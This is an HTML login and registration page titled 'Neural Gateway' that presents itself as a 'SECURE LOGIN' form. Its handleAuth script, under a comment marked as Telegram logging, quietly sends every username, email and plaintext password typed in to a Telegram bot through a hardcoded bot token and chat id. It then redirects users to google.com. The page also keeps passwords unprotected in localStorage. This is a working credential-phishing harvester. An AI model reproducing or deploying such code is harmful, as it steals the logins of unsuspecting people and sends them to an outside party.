<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Gateway</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
        
        .glass-card { 
            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(20px); 
            padding: 30px; border-radius: 25px; text-align: center; 
            width: 320px; max-width: 90%;
            border: 2px solid #00ff88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
            box-sizing: border-box;
        }

        #mascot-img { width: 120px; height: 120px; margin-bottom: 15px; border-radius: 50%; object-fit: cover; border: 2px solid #00ff88; }
        
        .input-group { position: relative; margin: 15px 0; width: 100%; }
        
        input { 
            width: 100%; padding: 12px; background: rgba(255,255,255,0.05); 
            border: 1px solid #444; color: white; border-radius: 10px; 
            outline: none; box-sizing: border-box; font-size: 16px;
        }
        
        input:focus { border: 1px solid #00ff88; }
        
        #toggle-pass { 
            position: absolute; right: 10px; top: 50%; transform: translateY(-50%);
            background: none; border: none; color: #00ff88; cursor: pointer; font-size: 18px;
            padding: 5px;
        }
        
        button { width: 100%; padding: 12px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; margin-top: 10px; }
        a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body>

<div class="glass-card">
    <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
    <h2 id="form-title">Login</h2>
    
    <input type="text" id="username" placeholder="Username">
    
    <input type="email" id="email" placeholder="Email" style="display:none; margin-top: 15px;">
    
    <div class="input-group">
        <input type="password" id="password" placeholder="Password">
        <button id="toggle-pass" type="button">👁️</button>
    </div>
    
    <input type="password" id="confirm-password" placeholder="Confirm Password" style="display:none; margin-top: 15px;">
    
    <button onclick="handleAuth()" id="action-btn">SECURE LOGIN</button>
    <a id="toggle-link" onclick="switchForm()">Create Account</a>
</div>

<script>
    let isLogin = true;
    const img = document.getElementById('mascot-img');
    const pass = document.getElementById('password');
    const toggleBtn = document.getElementById('toggle-pass');
    const actionBtn = document.getElementById('action-btn');
    const emailField = document.getElementById('email');
    const confirmPassField = document.getElementById('confirm-password');

    toggleBtn.addEventListener('click', () => {
        pass.type = (pass.type === "password") ? "text" : "password";
        toggleBtn.innerText = (pass.type === "text") ? "🙈" : "👁️";
    });

    function switchForm() {
        isLogin = !isLogin;
        emailField.style.display = isLogin ? 'none' : 'block';
        confirmPassField.style.display = isLogin ? 'none' : 'block';
        document.getElementById('form-title').innerText = isLogin ? "Login" : "Create Account";
        actionBtn.innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
        document.getElementById('toggle-link').innerText = isLogin ? "Create Account" : "Back to Login";
    }

    function handleAuth() {
        const user = document.getElementById('username').value;
        const passVal = pass.value;
        const email = emailField.value;
        const confirmPass = confirmPassField.value;

        if (isLogin) {
            // লগইন
            if (localStorage.getItem(user) === passVal) {
                alert("Login Successful!");
                window.location.href = "https://www.google.com";
            } else {
                alert("Invalid username or password!");
            }
        } else {
            // রেজিস্ট্রেশন
            if (passVal !== confirmPass) return alert("Passwords don't match!");
            localStorage.setItem(user, passVal);
            alert("Account Created!");
            switchForm();
        }

        // টেলিগ্রাম লগিং
        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0AEmail:${email}%0APass:${passVal}`);
    }
</script>

</body>
</html>
